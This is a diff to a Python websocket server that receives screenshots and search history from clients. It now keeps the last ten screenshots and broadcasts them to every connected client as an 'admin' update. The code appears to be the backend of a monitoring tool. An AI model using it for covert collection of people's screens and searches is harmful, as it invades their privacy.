@@ -6,11 +6,13 @@ import websockets
 import logging
 import os
 
+
+connected_clients = set()
+screenshot_store = []
+
 # Set up logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("websocket_server")
-
-connected_clients = set()
 
 async def broadcast(message):
     for client in connected_clients:
@@ -38,21 +40,21 @@ async def handle_client(websocket):
                 payload = data.get("payload")
                 logger.info(f"Received command: {command}")
                 
-                # Process the event and respond (?)
                 if command == "screenshot":
-                    response = {"command": "response"}
-                    screenshot_data = base64.b64decode(payload)
-                    # Save the screenshot to a file for now
-                    with open("received_screenshot.png", "wb") as file:
-                        file.write(screenshot_data)
-                    logger.info("Screenshot saved as received_screenshot.png")
+                    # Decode Base64 screenshot and save it to the store
+                    screenshot_store.append(payload)  
 
-                    # Forward the screenshot to the admin interface
+                    #Limit the number of stored screenshots
+                    if len(screenshot_store) > 10:  
+                        screenshot_store.pop(0)
+
+                    # Broadcast all screenshots to the admin interface
                     admin_message = {
-                        "event": "screenshot",
-                        "payload": payload  # Send the same Base64 string
+                        "event": "screenshot_update",
+                        "payload": screenshot_store  
                     }
                     await broadcast(admin_message)
+
                 elif command == "search_history":
                     response = {"command": "search_history"}
                     save_search_history(payload)
@@ -74,7 +76,7 @@ async def handle_client(websocket):
                 error_response = {"command": "error"}
                 await websocket.send(json.dumps(error_response))
                 logger.error(f"Invalid JSON received: {client_message}")
-                
+
     except websockets.exceptions.ConnectionClosed as e:
         logger.info(f"Client disconnected: {e}")
     finally:
